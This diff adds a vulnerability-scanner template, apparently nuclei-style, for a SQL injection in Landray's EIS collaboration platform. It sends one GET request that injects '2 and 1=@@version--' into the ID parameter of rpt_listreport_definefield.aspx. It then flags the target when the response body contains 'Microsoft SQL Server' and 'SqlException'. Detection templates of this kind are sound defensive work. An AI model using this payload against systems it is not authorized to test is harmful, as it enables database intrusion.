@@ -1,0 +1,22 @@
+id: landray-eis-sqli
+brief:
+    title: Landray EIS - SQL Injection
+    by: DhiyaneshDK
+    level: high
+    about: Landray's smart collaboration platform EIS has a very rich collection of modules to meet the needs of organizations and enterprises in knowledge, collaboration, and project management system constr...
+    label:
+        - landray
+        - eims
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+'
+      signs:
+        - "on": word
+          has:
+            - Microsoft SQL Server
+            - SqlException
+          in: body
+          need: all
